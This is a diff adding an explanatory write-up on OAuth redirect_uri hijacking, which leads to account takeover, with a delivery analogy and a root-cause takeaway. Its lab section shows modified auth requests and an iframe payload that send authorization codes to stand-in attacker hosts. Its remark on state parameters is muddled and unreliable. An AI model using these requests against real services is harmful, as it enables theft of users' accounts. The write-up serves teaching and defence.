@@ -1,0 +1,98 @@
+>**OAuth account hijacking via redirect_uri**
+
+
+
+
+Plaintext
+
+
+#############################################################
+#                   OAUTH REDIRECT URI HIJACKING REPORT                        #
+#                   [ STATUS: VULNERABILITY EXPLAINED ]                        #
+#############################################################
+
+### 0x01: THE CORE MECHANISM
+In a standard OAuth flow, after a user authenticates, the server issues a "proof of identity" to the application. 
+
+*   **The Secret:** Either an **Authorization Code** or an **Access Token**.
+*   **The Destination:** A specific endpoint called the `redirect_uri` (callback URL).
+
+
+
+---
+
+### 0x02: THE VULNERABILITY (THE "GLITCH")
+The security of this exchange relies entirely on the OAuth server **validating** where it sends that secret.
+
+*   **Expected Behavior:** The server only sends data to pre-approved, trusted URLs.
+*   **The Flaw:** If the server doesn't check the `redirect_uri` strictly, an attacker can manipulate it.
+
+**Target Transformation:**
+`LEGIT:` https://legit-app.com/callback
+`HIJACKED:` https://attacker.com
+
+---
+
+### 0x03: THE EXPLOIT FLOW
+1.  **Victim Interaction:** The victim logs into the service (or has an active session).
+2.  **Intercepted Redirect:** The OAuth server generates a valid code but follows the attacker's modified URI.
+3.  **Data Leak:** 
+    `GET https://attacker.com?code=XYZ`
+4.  **The Takeover:** The attacker steals the code from their own server logs and manually injects it into the real app's callback:
+    `https://legit-app.com/callback?code=XYZ`
+
+> [!IMPORTANT]
+> **The Result:** The attacker is now logged into the victim’s account (including Admin accounts) without ever needing a password. Protective measures like `state` parameters often fail here because the attacker initiates their own valid flow before hijacking the destination.
+
+
+
+---
+
+### 0x04: THE ANALOGY (DELIVERY REDIRECTION)
+Think of a package delivery system:
+1.  **The Order:** You buy an item (OAuth Login).
+2.  **The Question:** The company asks, "Where should we deliver this?" (`redirect_uri`).
+3.  **The Normal Way:** It arrives at your front door (Legit App).
+4.  **The Hijack:** If the company doesn't verify your home address against their records, an attacker can tell them, **"Send it to my house instead."**
+5.  **The Theft:** Your package (the sensitive code/token) is delivered directly to the attacker’s doorstep.
+
+---
+
+### 0x05: REAL-WORLD LAB EXAMPLE
+**Intercepted Request:**
+```http
+GET /auth?client_id=12345&redirect_uri=[https://legit-app.com/callback](https://legit-app.com/callback)
+````
+
+**Modified Request:**
+
+HTTP
+
+```
+GET /auth?client_id=12345&redirect_uri=[https://attacker-server.com](https://attacker-server.com)
+```
+
+**The Payload (Silent Execution):**
+
+An attacker can embed the malicious link in an iframe to trigger the leak without the victim noticing:
+
+HTML
+
+```
+<iframe src="https://oauth-server/auth?...&redirect_uri=attacker-server.com"></iframe>
+```
+
+---
+
+### 0x06: ROOT CAUSE & TAKEAWAY
+
+- **Technical Failure:** The OAuth server allows arbitrary external domains instead of enforcing a strict **Allowlist**.
+    
+- **One-Line Takeaway:** Failure to strictly validate the `redirect_uri` allows attackers to intercept authorization codes, leading to **full account takeover**.
+    
+
+Plaintext
+
+```
+[ SYSTEM STATUS: SECURE IF REDIRECT_URI IS VALIDATED ]
+```
